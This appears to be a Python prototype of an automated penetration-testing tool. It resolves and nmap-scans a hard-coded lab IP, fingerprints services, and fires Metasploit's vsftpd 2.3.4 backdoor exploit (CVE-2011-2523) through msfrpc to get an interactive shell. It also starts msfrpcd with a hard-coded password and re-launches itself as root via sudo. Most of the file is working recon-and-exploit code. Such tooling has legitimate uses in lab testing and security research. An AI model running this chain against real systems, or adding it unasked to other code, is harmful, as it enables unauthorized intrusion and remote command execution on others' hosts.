import time
import networkx
import socket
import ipaddress
import platform
import subprocess
import nmap
from anytree import Node, PreOrderIter
from anytree.exporter import DotExporter
from pymetasploit3.msfrpc import MsfRpcClient
import matplotlib.pyplot as plt
import sys
import os


msfrpc_password = 'temppassword'

# Variables for visualization
step = 0
VISUALIZE = False


class DataNode:
    full_nodes = []
    exec_tree_root = Node('Start')

    def __init__(self, g):
        self.g = g
        self.functions = []

    def report(self):
        return

    def _add_object_functions(self, obj, *functions):
        for f in functions:
            self.g.add_edge(obj, f, isfunction=True)

    def add_functions(self, *functions):
        for f in functions:
            self.g.add_edge(self, f, isfunction=True)

    def check_neighbor_links(self, data):
        return data not in [i for i in self.g.neighbors(self)]

    def add_data(self, *data):
        for d in data:
            if self.check_neighbor_links(d):
                print(' + New object found', d)
                self.g.add_edge(self, d, isfunction=False)
                self._add_object_functions(d, *d.functions)

    def run(self):
        # Visualize graph
        global VISUALIZE
        if VISUALIZE:
            global step
            nodes = self.g.nodes
            labels = {}
            for n in nodes:
                try:
                    labels.update({n: n.__name__})
                except AttributeError:
                    labels.update({n: str(n)})
            networkx.draw(self.g, with_labels=True, labels=labels)
            plt.savefig('g{}.png'.format(step))
            plt.clf()
            step += 1

        neighbors = self.g[self].copy()
        for obj, t in neighbors.items():
            if t['isfunction']:
                obj()
                self.g.remove_node(obj)
                # Create execution tree
                last_function = list(PreOrderIter(type(self).exec_tree_root))[-1]
                Node(obj.__qualname__, parent=last_function)

        self.end()
        neighbors = self.g[self].copy()
        for obj, t in neighbors.items():
            if not t['isfunction']:
                if obj not in type(self).full_nodes:
                    obj.run()


    def save_execution_tree(self):
        # Save execution tree
        if VISUALIZE:
            file_name = 'Execution_tree-{}.dot'.format(str(int(time.time())))
            DotExporter(type(self).exec_tree_root).to_dotfile(file_name)
            subprocess.run(['dot', '-T', 'png', file_name, '-O'])

    def end(self):
        edges_list = dict(self.g[self]).items()
        for obj, t in edges_list:
            if t['isfunction']:
                return False
        if self not in type(self).full_nodes:
            type(self).full_nodes.append(self)
        print(' -', self, 'Finished')
        return True


class Domain(DataNode):
    def __init__(self, g, domain):
        super().__init__(g)
        self.domain = domain
        self.functions = [self.getIP]

    def __str__(self):
        return 'Domain: {}'.format(self.domain)

    def __eq__(self, other):
        if not isinstance(other, type(self)):
            return False
        return self.domain == other.domain

    def __hash__(self):
        return hash(self.domain)

    def _socket_get_ip(self):
        ip_addr = socket.gethostbyname(self.domain)
        ip_addr = ipaddress.ip_address(ip_addr)
        ip = HostIP(self.g, ip_addr)
        self.add_data(ip)

    def getIP(self):
        print('Resolving domain name')
        self._socket_get_ip()


class Service(DataNode):
    def __init__(self, g, port=None, transport=None, state=None, proto_name=None, product=None, version=None,
                 extrainfo=None, script_info=None):
        super().__init__(g)
        self.port = port
        self.state = state
        self.transport = transport
        self.proto_name = proto_name
        self.product = product
        self.version = version
        self.extrainfo = extrainfo
        self.script_info = script_info
        self.functions = []
        # metasploit
        global msfrpc_password
        self.msf_client = MsfRpcClient(msfrpc_password, port=55553)

    def __str__(self):
        return self.proto_name

    def __eq__(self, other):
        if not isinstance(other, type(self)):
            return False
        return (str(self.port) + self.proto_name) == (str(other.port) + other.proto_name)

    def __hash__(self):
        return hash(str(self.port) + self.proto_name)

class SSH(Service):
    def __init__(self, g, port=None, transport=None, state=None, proto_name=None, product=None, version=None,
                 extrainfo=None, script_info=None):
        super().__init__(g, port, transport, state, proto_name, product, version, extrainfo, script_info)


class HTTP(Service):
    def __init__(self, g, port=None, transport=None, state=None, proto_name=None, product=None, version=None,
                 extrainfo=None, script_info=None):
        super().__init__(g, port, transport, state, proto_name, product, version, extrainfo, script_info)


class FTP(Service):
    def __init__(self, g, port=None, transport=None, state=None, proto_name=None, product=None, version=None,
                 extrainfo=None, script_info=None):
        super().__init__(g, port, transport, state, proto_name, product, version, extrainfo, script_info)
        self.functions = [self.testForCVE20112523, ]

    def _get_linked_host(self):
        neighbors = list(self.g[self])
        for n in neighbors:
            if type(n) == HostIP:
                return n

    def testForCVE20112523(self):
        if self.version != '2.3.4' or self.product != 'vsftpd':
            return
        target_host = self._get_linked_host()
        target_ip = str(target_host.ip)
        print('Testing for CVE2011-2523 for {}'.format(target_ip))
        exploit = self.msf_client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
        exploit['RHOSTS'] = target_ip
        res = exploit.execute(payload='cmd/unix/interact')
        if res['job_id']:
            pass
        # print(self.msf_client.sessions.list)
        # shell = self.msf_client.sessions.session('1')
        # shell.write('whoami')
        # print(shell.read())



class OS(DataNode):
    def __init__(self, g, os_name=None, vendor=None, version=None, cpe=None):
        super().__init__(g)
        self.os_name = os_name
        self.vendor = vendor
        self.version = version
        self.cpe = cpe

    def __str__(self):
        return 'OS:' + self.os_name

    def __eq__(self, other):
        if not isinstance(other, OS):
            return False
        return (str(other.cpe) + str(other.version)+other.os_name) == (str(self.cpe) + str(self.version) + self.os_name)

    def __hash__(self):
        hstr = 'OS'
        for i in [self.os_name, self.vendor, self.version, self.cpe]:
            if i:
                hstr += i
        return hash(hstr)

class HostIP(DataNode):
    def __init__(self, g, ip):
        super().__init__(g)
        self.ip = ip
        self.alive = None
        self.vendor = None
        self.functions = [self.checkIfAlive, self.getDomain, self.scanSevices]

    def __str__(self):
        return 'Host {}'.format(str(self.ip))

    def __eq__(self, other):
        if not isinstance(other, HostIP):
            return False
        return str(self.ip) == str(other.ip)

    def __hash__(self):
        return hash(self.ip)

    def _ping(self):
        host = str(self.ip)
        param = '-n' if platform.system().lower() == 'windows' else '-c'
        command = ['ping', param, '1', host]
        return subprocess.call(command) == 0

    def _nmap_alive_check(self):
        nm = nmap.PortScanner()
        nm.scan(hosts=str(self.ip), arguments='-n -sP -PR -PE -PA21,23,80,3389')
        try:
            return True if nm[str(self.ip)].state() == 'up' else False
        except KeyError:
            return False

    def checkIfAlive(self):
        print('Checking if host {} is up'.format(str(self.ip)))
        #p1 = self._ping()
        p2 = self._nmap_alive_check()
        self.alive = p2

    def _socket_get_domain(self):
        try:
            d = socket.gethostbyaddr(str(self.ip))[0]
            d = Domain(self.g, d)
            self.add_data(d)
        except socket.herror:
            pass

    def getDomain(self):
        print('Performing reverse DNS lookup')
        self._socket_get_domain()

    def _nmap_port_scan(self):
        nm = nmap.PortScanner()
        nm.scan(hosts=str(self.ip), arguments='-Pn -F -O -A')
        scan_info = nm[str(self.ip)]
        # Fill service information
        for transport_proto in scan_info.all_protocols():
            for port in scan_info[transport_proto].keys():
                name = scan_info[transport_proto][port]['name']
                state = scan_info[transport_proto][port]['state']
                product = scan_info[transport_proto][port]['product']
                version = scan_info[transport_proto][port]['version']
                extrainfo = scan_info[transport_proto][port]['extrainfo']
                try:
                    script_info = scan_info[transport_proto][port]['script']
                except KeyError:
                    script_info = None

                match state, name:
                    case 'open', 'ssh':
                        ssh = SSH(self.g, state=state, proto_name=name, transport=transport_proto, product=product,
                                  version=version, extrainfo=extrainfo, script_info=script_info)
                        self.add_data(ssh)
                    case 'open', 'ftp':
                        ftp = FTP(self.g, state=state, proto_name=name, transport=transport_proto, product=product,
                                  version=version, extrainfo=extrainfo, script_info=script_info)
                        self.add_data(ftp)
                    case 'open', 'http':
                        http = HTTP(self.g, state=state, proto_name=name, transport=transport_proto, product=product,
                                    version=version, extrainfo=extrainfo, script_info=script_info)
                        self.add_data(http)

            # Fill OS information if available
            try:
                os = nm[str(self.ip)]['osmatch'][0]['osclass'][0]
            except KeyError:
                pass
            name = os['osfamily']
            vendor = os['vendor']
            version = os['osgen']
            cpe = os['cpe'][0]
            os = OS(self.g, name, vendor, version, cpe)
            self.add_data(os)

    def scanSevices(self):
        if self.alive == None:
            self.add_functions(self.scanSevices)
            return

        print('Start services scanning')
        if self.alive == False:
            return
        self._nmap_port_scan()


class Test(DataNode):
    def __init__(self, g):
        super().__init__(g)
        self.target = HostIP(g, '192.168.193.136')
        self.g.add_node(self, isfunction=False)
        self.functions = [self.startMsfrpcServer, ]
        self.add_functions(*self.functions)
        self.add_data(self.target)

    def __str__(self):
        return 'Root Object'

    def startMsfrpcServer(self):
        print('(f) Starting msfrpc server')
        check = subprocess.run(['sudo lsof -i -P -n | grep 55553'], shell=True, capture_output=True)
        if check.stdout:
            return
        global msfrpc_password
        subprocess.run(['msfrpcd', '-P', msfrpc_password, '-S'])


def run_as_root():
    euid = os.geteuid()
    if euid != 0:
        args = ['sudo', sys.executable] + sys.argv + [os.environ]
        os.execlpe('sudo', *args)

run_as_root()

g = networkx.Graph()
t = Test(g)
t.run()
t.save_execution_tree()
# h = t.target
# h.run()
# d = list(g.nodes)[2]
# g = networkx.Graph()
# h = HostIP(g, '127.0.0.1')
# g.add_node(h)
#h.run()
# d = list(g[h])[0]
# d.run()